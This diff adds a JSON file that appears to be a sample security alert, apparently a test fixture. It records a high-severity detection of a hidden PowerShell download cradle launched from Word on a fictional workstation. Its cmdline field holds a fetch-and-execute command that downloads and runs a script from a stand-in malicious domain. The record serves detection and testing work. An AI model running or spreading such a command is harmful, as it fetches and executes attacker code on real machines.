@@ -1,0 +1,22 @@
+{
+  "alert_id": "a1b2c3",
+  "severity": "high",
+  "title": "Suspicious PowerShell download cradle",
+  "hostname": "WKS-FIN-042",
+  "device_fqdn": "wks-fin-042.corp.acme.com",
+  "local_ip": "10.20.4.17",
+  "user": "ACME\\jdoe",
+  "user_principal_name": "john.doe@acme.com",
+  "process": {
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "cmdline": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://update-check.evil-cdn.xyz/a.ps1')\"",
+    "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+    "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  },
+  "network": [
+    {"dst": "185.220.101.47", "port": 443, "domain": "update-check.evil-cdn.xyz"},
+    {"dst": "8.8.8.8", "port": 53}
+  ],
+  "tenant": "acme.sharepoint.com",
+  "mac": "00:1A:2B:3C:4D:5E"
+}
